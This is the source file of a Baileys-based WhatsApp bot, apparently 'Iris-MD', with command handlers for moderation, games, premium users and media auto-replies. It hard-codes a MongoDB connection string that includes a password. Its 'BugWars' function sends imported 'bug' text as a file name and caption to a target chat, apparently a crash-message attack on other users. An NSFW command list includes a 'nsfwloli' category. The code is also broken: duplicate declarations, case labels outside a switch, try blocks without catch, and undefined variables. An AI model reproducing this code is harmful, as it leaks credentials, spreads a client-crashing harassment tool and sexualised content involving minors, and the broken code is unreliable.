// ====== MAIN-VARS_SETTINGS ======= //
process.on("uncaughtException", console.error);
require("./settings");


// ===== JUST MODULES ===== //
const fs = require('fs')
const os = require('os')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const { EmojiAPI } = require("emoji-api")
const more = String.fromCharCode(8206)
const _ = require("lodash")
const yargs = require("yargs/yargs")
const currentDate = new Date()
const options = { weekday: 'long' }
const currentDay = new Intl.DateTimeFormat('en-US', options).format(currentDate)
const readmore = more.repeat(4001)
const pm2 = require('pm2')
const util = require("util")
const { promisify } = require('util')
const setTimeoutPromise = promisify(setTimeout)
const eco = require('discord-mongoose-economy')
const Jimp = require('jimp')
const modapk = require("tod-api")
const gis = require("g-i-s")
const ty = global.mongourl ? eco.connect(global.mongourl) : eco.connect('mongodb+srv://Arch:1t6l2G0r6nagLlOb@cluster0.gedh4.mongodb.net/?retryWrites=true&w=majority')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getAggregateVotesInPollMessage, getContentType, MessageType } = require('@whiskeysockets/baileys')
const spaceemojis = ["🌌", "🌠", "🚀", "🪐", "🌟"]
const manyemojis = ["😄", "👍", "👏", "👌", "🥇", "🌟", "🎉", "🙌", "🤩", "💯", "🔥", "✨", "🚀", "💖", "🌈", "🌞", "🌠", "🌼", "💪", "😎", "💫", "💓", "🎈", "🎁", "🍾", "🎊", "🥳", "👑", "🌺", "🌻", "🌸"]



// ====== IMPORTED MODULES ======= //
const settings = require('./settings')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { instadl } = require('./lib/instadl')
const { isLimit, limitAdd, getLimit, giveLimit, kurangBalance, getBalance, isGame, gameAdd, givegame, addBalance, cekGLimit } = require('./lib/limit.js')
const githubstalk = require('./lib/githubstalk')
let { covid } = require('./lib/covid.js')
const { Gempa } = require("./lib/gempa.js")
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk")
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")




// ====== DATABASE ====== //
const { venoxtext1 } = require('./lib/bugs/venoxtext1')
//
//
let premium = global.premium || settings.PREMIUM || "8801853262586";
let isSleeping = false;
let banUser = JSON.parse(fs.readFileSync('./lib/database/banUser.json'));
let banchat = JSON.parse(fs.readFileSync('./lib/database/banChat.json'));
let venoxaudio = JSON.parse(fs.readFileSync('./lib/audio/audio.json'));
let _limit = JSON.parse(fs.readFileSync('./lib/database/user/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./lib/database/user/bounty.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./lib/database/user/blood.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./lib/database/nsfw.json')); 
let pendaftar = JSON.parse(fs.readFileSync('./lib/database/user/user.json'))
let balance = JSON.parse(fs.readFileSync('./lib/database/balance.json'))
let ssewa = JSON.parse(fs.readFileSync('./lib/database/sewa.json'))
let ban = JSON.parse(fs.readFileSync('./lib/database/ban.json'))
let autosticker = JSON.parse(fs.readFileSync('./lib/database/autosticker.json'))
const _autostick = JSON.parse(fs.readFileSync('./lib/database/autostickpc.json'))
let limit = JSON.parse(fs.readFileSync('./lib/database/limit.json'))
let setik = JSON.parse(fs.readFileSync('./lib/database/src/sticker.json'))
let vien = JSON.parse(fs.readFileSync('./lib/database/src/audio.json'))
let imagi = JSON.parse(fs.readFileSync('./lib/database/src/image.json'))
let videox = JSON.parse(fs.readFileSync('./lib/database/src/video.json'))
global.db = JSON.parse(fs.readFileSync('./lib/database/src/database.json'))
let _sewa = require("./lib/sewa");
const sewa = JSON.parse(fs.readFileSync('./lib/database/sewa.json'))
let _owner = global.ownernomer || settings.SUDO || "8801853262586";
let owner = global.ownernomer || settings.SUDO || "8801853262586";
let _afk = JSON.parse(fs.readFileSync('./lib/database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./lib/database/total-hit-user.json'))

//
//
const VoiceNoteVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/vn.json'))
const StickerVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/sticker.json'))
const ImageVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/image.json'))
const VideoVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/video.json'))
const DocVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/doc.json'))
const ZipVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/zip.json'))
const ApkVenox = JSON.parse(fs.readFileSync('./lib/database/autoreply/apk.json'))


//============= GLOBAL DATABASE ===============//
global.db.data = JSON.parse(fs.readFileSync("./lib/database/database.json"));
if (global.db.data)
  global.db.data = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db.data || {}),
  };

let vote = (db.data.others.vote = []);
let kuismath = (db.data.game.math = []);
// ========== TZ AND TIME ========== //
const iristime = moment.tz('Asia/Dhaka').format('HH:mm:ss')
const irisdate = moment.tz('Asia/Dhaka').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Dhaka').format('HH:mm:ss')
//
let nowtime = '';
if (time2 < "05:00:00") {
  nowtime = 'Good night 🏙';
} else if (time2 < "11:00:00") {
  nowtime = 'Good morning 🌅';
} else if (time2 < "15:00:00") {
  nowtime = 'Good afternoon 🏞';
} else if (time2 < "18:00:00") {
  nowtime = 'Good evening 🌇';
} else if (time2 < "19:00:00") {
  nowtime = 'Good evening 🌆';
} else {
  nowtime = 'Good night 🌌';
}
//
//
const timestampe = speed();
const latensie = speed() - timestampe


// ===== MODULE.EXPORTS ===== //
module.exports = Venox = async (Venox, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await Venox.decodeJid(Venox.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await Venox.groupMetadata(m.chat).catch(e => {}) : ''
        const isBan = banUser.includes(m.sender)
        const isBanChat = m.isGroup ? banchat.includes(from) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernomer,"8801853262586", ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(Venox, m, premium);



// ============ REPLY MSG ========== //
let myreply = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "displayName": "IRIS-MD","vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=8801853262586:8801853262586\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" };

const irisreply = (teks) => {
       Venox.sendMessage(m.chat, { text: teks, contextInfo: { externalAdReply: {
         title: global.botname,
         body: `A lightweight whatsapp bot 🍀`,
         sourceUrl: global.link,
         mediaUrl: "",
         mediaType: 1,
         showAdAttribution: true,
         renderLargerThumbnail: false,
         thumbnailUrl: `https://i.ibb.co/G35jn3J/bot2p.jpg` }}}, { quoted: myreply });
    };
// ============ BUG REPLY ============ //
const venoxium = (texto) => {
Venox.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const follow_venox = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Base By XeonSama`
}}
}

async function BugWars(venoxy,chat) {
Venox.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${venoxy}.${venoxtext1}` ,
caption: `${venoxy + venoxtext1}`,
}, {quoted: follow_venox })
}

// ======== ANTILINK STUFF ========= //
let chats = global.db.data.chats[from];
      if (typeof chats !== "object") global.db.data.chats[from] = {};
      if (chats) {
        if (!("antilink" in chats)) chats.antilink = false;
        if (!("antilinkgc" in chats)) chats.antilinkgc = false;
      } else
        global.db.data.chats[from] = {
          antilink: false,
          antilinkgc: false,
        };
// =============== //
if (antilink) {
  var rondonxk = '[-a-zA-Z0-9@:%._+~#=].[-a-zA-Z0-9@:%._+~#=].[-a-zA-Z0-9()@:%_+.~#?&/=]';
  if (budy.includes("https://") || budy.includes("http://")) {
    if (!isBotAdmins) return;
    const bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by admin so no action will be taken!`;
    if (isAdmins || m.key.fromMe || isCreator) return reply(bvl);
    const kice = m.sender;
    await Venox.sendMessage(
      from,
      {
        delete: {
          remoteJid: from,
          id: m.id,
          participant: m.sender,
        },
      },
      {
        quoted: m,
      }
    );
    await Venox.sendMessage(from, { text: `\`\`\`「  Antilink System  」\`\`\`\n\n*⚠️ Group link detected!*\n\n*🚫@${kice.split("@")[0]} You are not allowed to send any links in this group!*\n`, contextInfo: { mentionedJid: [kice] } }, { quoted: m });
  }
}
// ====== LOADING ====== //
async function loading() {
    var loadingSteps = [
        "```🍀 Initializing...```",
        "```🌈 Loading modules...```",
        "```🎌 Setting up environment...```",
        "```🌸 Fetching data...```",
        "```🌕 Finalizing...```",
        "```C o m p l e t e...!```🚀",
    ];
    let { key } = await Venox.sendMessage(from, {
        text: "ʟᴏᴀᴅɪɴɢ...",
    });

    for (let i = 0; i < loadingSteps.length; i++) {
        await Venox.sendMessage(from, { text: loadingSteps[i], edit: key });
    }
}
// ======== RANDOM MSGS ========== //
const pickRandom = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)];
};

const smallinput = budy.toLowerCase();

const greetings = {
  'hello': `🌟 Hello ${pushname}, I am ${BotName}. How can I assist you today? 🤖`,
  'hi': `🌈 Hi ${pushname}, did it hurt? When you fell from heaven? 😊`,
  'hey': `🌼 Hey there ${pushname}, are you a magician? Because whenever I look at you, everyone else disappears. 🎩✨`,
  'how are you': `🌟 Hey ${pushname}, do you believe in love at first sight, or should I walk by again? 😏`,
  'commands': `📋 Sure! Here are some available commands:\n- ${prefix}help: Display available commands.\n- ${prefix}weather [city]: Get the weather forecast for a specific city.\n- ${prefix}joke: Get a random joke.\n- ${prefix}quote: Get a random quote.\n- ${prefix}news: Get the latest news headlines.\n- ${prefix}translate [text]: Translate text to another language. ℹ️`,
  'good morning': `🌞 Good morning, ${pushname}! Did you have lucky charms for breakfast? Because you look magically delicious! 🍀😉`,
  'ohayo': `🌅 Ohayo ${pushname}! Are you made of copper and tellurium? Because you're Cu-Te! 😊`,
  'konichiwa': `🌸 Konichiwa ${pushname}! Are you a time traveler? Because I can't imagine my future without you. ⏳💕`,
  'good afternoon': `🌤️ Good afternoon, ${pushname}! Are you a parking ticket? Because you have "fine" written all over you. 😉`,
  'good evening': `🌙 Good evening, ${pushname}! If you were a vegetable, you'd be a cute-cumber! 🥒😄`,
  'good night': `🌟 Good night, ${pushname}! Are you tired? Because you've been running through my mind all day. 💭😴`,
  'sweet dreams': `🌠 Sweet dreams, ${pushname}! I hope your dreams are as sweet as you are! 🌈✨`,
  'venox': `Sensei is sleeping, and I lost connection with him... 🌌`,
};

for (const [keyword, response] of Object.entries(greetings)) {
  if (smallinput.includes(keyword)) {
    reply(response);
    break;
  }
}
// ======= OTHER STUFF ====== //
 if (!Venox.public) {
 if (!isCreator && !m.key.fromMe) return
}

if (global.autoread) {
  Venox.readMessages([m.key])
}
  
if (global.autoRecording) {
  Venox.sendPresenceUpdate('recording', from)
}

if (global.autoTyping) {
  Venox.sendPresenceUpdate('composing', from)
}

      
Venox.sendPresenceUpdate('unavailable', from)

if (global.autorecordtype) {
let vrecord = ['recording','composing']
let vrecording = vrecord[Math.floor(Math.random() * vrecord.length)]
Venox.sendPresenceUpdate(vrecording, from)
}

if (global.autobio) {
  Venox.updateProfileStatus(`🍀 Iris-Md by\n🍀 VenoxSenpai\n\n💬 Contact: +8801853262586`).catch(_ => _)
}
let list = []
        for (let i of owner) {
list.push({
	    	displayName: await Venox.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Venox.getName(i)}\nFN:${await Venox.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
}
//----------------------------------------------------------------------------------------------------
 if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./lib/database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./lib/database/total-hit-user.json'))[0].hit_cmd
        }
//----------------------------------------------------------------------------------------------------
this.game = this.game || {};
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state === 'PLAYING');

if (room) {
  let isWin = false;
  let isTie = false;
  let isSurrender = false;

  if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return;

  isSurrender = !/^[1-9]$/.test(m.text);

  if (m.sender !== room.game.currentTurn && !isSurrender) return;

  let ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1);
  if (!isSurrender && ok < 1) {
    irisreply({
      '-3': 'Game Has Ended',
      '-2': 'Invalid',
      '-1': 'Invalid Position',
      '0': 'Invalid Position',
    }[ok]);
    return;
  }

  if (m.sender === room.game.winner) isWin = true;
  else if (room.game.board === 511) isTie = true;

  let arr = room.game.render().map(v => ({
    'X': '❌',
    'O': '⭕',
    '1': '1️⃣',
    '2': '2️⃣',
    '3': '3️⃣',
    '4': '4️⃣',
    '5': '5️⃣',
    '6': '6️⃣',
    '7': '7️⃣',
    '8': '8️⃣',
    '9': '9️⃣',
  }[v]));

  if (isSurrender) {
    room.game._currentTurn = m.sender === room.game.playerX;
    isWin = true;
  }

  let winner = isSurrender ? room.game.currentTurn : room.game.winner;
  let str = `Room ID: ${room.id}\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\nTyped *surrender* to surrender and admit defeat`;

  if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat;

  if (room.x !== room.o) {
    await Venox.sendText(room.x, str, m, { mentions: parseMention(str) });
  }
  await Venox.sendText(room.o, str, m, { mentions: parseMention(str) });

  if (isTie || isWin) {
    delete this.game[room.id];
  }
}
//----------------------------------------------------------------------------------------------------
for (let botto of venoxaudio) {
  if (budy === botto) {
    try {
      let result0 = fs.readFileSync(`./lib/media/audio/${botto}.mp3`);
      Venox.sendMessage(m.chat, { audio: result0, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
    } catch (error) {
      console.error(error);
}
}
}
for (let botto of venoxsticker) {
  if (budy === botto) {
    try {
      let result1 = fs.readFileSync(`./lib/media/sticker/${botto}.webp`);
      Venox.sendMessage(m.chat, { audio: result1 }, { quoted: m });
    } catch (error) {
      console.error(error);
}
}
}
for (let botto of venoximage) {
  if (budy === botto) {
    try {
      let result2 = fs.readFileSync(`./lib/media/image/${botto}.jpg`);
      Venox.sendMessage(m.chat, { audio: result2 }, { quoted: m });
    } catch (error) {
      console.error(error);
}
}
}
for (let botto of venoxvideo) {
  if (budy === botto) {
    try {
      let result3 = fs.readFileSync(`./lib/media/video/${botto}.mp4`);
      Venox.sendMessage(m.chat, { audio: result3 }, { quoted: m });
    } catch (error) {
      console.error(error);
}
}
}
const sendapk = (teks) => {
Venox.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let botto of venoxapk) {
  if (budy === botto) {
    try {
      let result4 = fs.readFileSync(`./lib/media/apk/${botto}.apk`);
      sendapk(result4)
}
}
}

const sendzip = (teks) => {
Venox.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let botto of venoxzip) {
  if (budy === botto) {
    try {
      let result5 = fs.readFileSync(`./lib/media/zip/${botto}.zip`);
      sendzip(result5)
}
}
}

const send_doc = (teks) => {
Venox.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let botto of venoxdoc) {
  if (budy === botto) {
    try {
      let result6 = fs.readFileSync(`./lib/media/doc/${botto}.pdf`);
      send_doc(result6)
}
}
}

if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    irisreply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./lib/database/afk-user.json', JSON.stringify(_afk))
                Venox.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
// ======================= MAIN CASES =========================== //
const nsfwCommands = {
  'ahegao': 'ahegao.json',
  'ass': 'ass.json',
  'bdsm': 'bdsm.json',
  'blowjob': 'blowjob.json',
  'cuckold': 'cuckold.json',
  'cum': 'cum.json',
  'eba': 'eba.json',
  'ero': 'ero.json',
  'femdom': 'femdom.json',
  'foot': 'foot.json',
  'gangbang': 'gangbang.json',
  'glasses': 'glasses.json',
  'hentai': 'hentai.json',
  'jahy': 'pussy.json',
  'mangansfw': 'manga.json',
  'masturbation': 'masturbation.json',
  'milf': 'milf.json',
  'neko': 'neko.json',
  'neko2': 'neko2.json',
  'nsfwloli': 'nsfwloli.json',
  'orgy': 'orgy.json',
  'panties': 'panties.json',
  'pussy': 'pussy.json',
  'tentacles': 'tentacles.json',
  'thighs': 'thighs.json'
};
//----------------------------------------------------------------------------------------------------
for (let command in nsfwCommands) {
  switch (command) {
    case 'ahegao':
    case 'ass':
    case 'bdsm':
    case 'blowjob':
    case 'cuckold':
    case 'cum':
    case 'eba':
    case 'ero':
    case 'femdom':
    case 'foot':
    case 'gangbang':
    case 'glasses':
    case 'hentai':
    case 'jahy':
    case 'mangansfw':
    case 'masturbation':
    case 'milf':
    case 'neko':
    case 'neko2':
    case 'nsfwloli':
    case 'orgy':
    case 'panties':
    case 'pussy':
    case 'tentacles':
    case 'thights':
      if (isBan || isBanChat || !m.isGroup || !AntiNsfw) return;
      Venox.sendMessage(from, { react: { text: "🥵", key: m.key } });
      
      var nsfwdata = JSON.parse(fs.readFileSync(`./lib/media/nsfw/${nsfwCommands[command]}`));
      var numberOfPictures = 3;

      function getRandomPictures(array, count) {
        var shuffled = array.slice();
        var i = array.length;
        var min = i - count;
        var temp;
        var index;

        while (i-- > min) {
          index = Math.floor((i + 1) * Math.random());
          temp = shuffled[index];
          shuffled[index] = shuffled[i];
          shuffled[i] = temp;
        }

        return shuffled.slice(min);
      }

      var selectedPictures = getRandomPictures(nsfwdata, numberOfPictures);

      for (let picture of selectedPictures) {
        Venox.sendMessage(m.chat, { caption: mess.done, image: { url: picture.url } }, { quoted: m });
      }
      break;

    default:
      if (isBan || isBanChat || !m.isGroup || !AntiNsfw) return;
      Venox.sendMessage(from, { react: { text: "🥵", key: m.key } });

      var nsfwdata = JSON.parse(fs.readFileSync(`./lib/media/nsfw/${nsfwCommands[command]}`));
      var venoxresult = pickRandom(nsfwdata);
      Venox.sendMessage(m.chat, { caption: mess.done, image: { url: venoxresult.url } }, { quoted: m });
      break;
  }
}
//----------------------------------------------------------------------------------------------------
case 'setprefix': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!isCreator) return reply(mess.owner);

    Venox.sendMessage(from, { react: { text: "🍀", key: m.key } });

    if (args.length !== 1) {
        return irisreply(`Please provide a single character as the new prefix.`);
    } else {
        const newPrefix = args[0];
        try {
            global.prefa[0] = newPrefix;
            return irisreply(`${pushname}, prefix changed successfully to "${newPrefix}"`);
        } catch (error) {
            return irisreply(`An error occurred while changing the prefix. Please try again later.`);
        }
    }
    break;
}

//----------------------------------------------------------------------------------------------------

case 'restart': {
    await Venox.sendMessage(from, { react: { text: "⚙", key: m.key } });
    if (!isCreator) return reply(mess.owner);

    await Venox.sendMessage(from, { text: mess.wait });
    await Venox.sendMessage(from, { react: { text: "✅", key: m.key } });
    await Venox.sendMessage(from, { text: 'Restarting Success!' });
    pm2.restart('index', (err) => {
        if (err) {
            Venox.sendMessage(from, { react: { text: "❌", key: m.key } });
            Venox.sendMessage(from, { text: 'Restarting Failed!' });
        } else {
            return;
        }
    });
    break;
}
	    
//----------------------------------------------------------------------------------------------------
	    
case 'shutdown': case 'sleep': {

    if (!isCreator) return reply(mess.owner)
    if (isBanChat) return reply(mess.bangc);
    await Venox.sendMessage(from, { react: { text: "⚠️", key: m.key } })

    irisreply(`Tata its time to sleep!`)
    await sleep(5000)
    process.exit()
    break;
}
	    
//----------------------------------------------------------------------------------------------------
	    
   case 'mode': {
	if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return irisreply(mess.owner);
	Venox.sendMessage(from, { react: { text: '❤', key: m.key } });
	   
        if (args.length < 1) return irisreply(`Example ${prefix + command} public/private`);
        const mode = args[0].toLowerCase();
        if (mode === 'public') {
            Venox.public = true;
            irisreply(mess.done);
        } else if (mode === 'private') {
            Venox.public = false;
            irisreply(mess.done);
        } else {
            irisreply('Invalid mode. Use "public" or "private".');
        }
    }
    break;
	    
// ----------------------------------------------------------------------------------------------------
	    
case 'autotyping':
case 'auto-typing': {

    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    if (!isCreator) return irisreply(mess.owner);
    Venox.sendMessage(from, { react: { text: '❤', key: m.key } });

    if (args.length === 0) {
        if (global.autoTyping) {
            return irisreply(`Auto typing in group chats is currently *enabled*.\n\nTo disable, use \`${global.prefa[0]}autotyping off\`.`);
        } else {
            return irisreply(`Auto typing in group chats is currently *disabled*.\n\nTo enable, use \`${global.prefa[0]}autotyping on\`.`);
        }
    } else if (args.length === 1 && (args[0] === 'on' || args[0] === 'off')) {
        const status = args[0];
        if (status === 'on') {
            global.autoTyping = true;
            return irisreply(`Auto typing in group chats is now *enabled*.`);
        } else {
            global.autoTyping = false;
            return irisreply(`Auto typing in group chats is now *disabled*.`);
        }
    } else {
        return irisreply(`Usage: \`${global.prefa[0]}autotyping [on/off]\``);
    }
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'autorecord':
case 'auto-recording':

    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    if (!isCreator) return irisreply(mess.owner);
    Venox.sendMessage(from, { react: { text: '❤', key: m.key } });

    if (args.length === 0) {
        if (global.autoRecording) {
            return irisreply(`Auto recording is currently *enabled*.\n\nTo disable, use \`${global.prefa[0]}autorecording off\`.`);
        } else {
            return irisreply(`Auto recording is currently *disabled*.\n\nTo enable, use \`${global.prefa[0]}autorecording on\`.`);
        }
    } else if (args.length === 1 && (args[0] === 'on' || args[0] === 'off')) {
        const status = args[0];
        if (status === 'on') {
            global.autoRecording = true;
            return irisreply(`Auto recording is now *enabled*.`);
        } else {
            global.autoRecording = false;
            return irisreply(`Auto recording is now *disabled*.`);
        }
    } else {
        return irisreply(`Usage: \`${global.prefa[0]}autorecord [on/off]\``);
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'addprem':
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    if (!isCreator) return irisreply(mess.owner);
     Venox.sendMessage(from, { react: { text: '❤', key: m.key } });

    if (args.length < 2)
        return irisreply(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser(m.mentionedJid[0], args[1], premium);
        }
        irisreply("Premium Success");
    } else {
        addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
        irisreply("Success");
    }
    break;
	    
//----------------------------------------------------------------------------------
	    
case 'delprem':
    if (!isCreator) return irisreply(mess.owner);
    if (isBan) return irisreply(mess.banned);
    if (isBanChat) return irisreply(mess.bangc);
    Venox.sendMessage(from, { react: { text: '❤', key: m.key } });

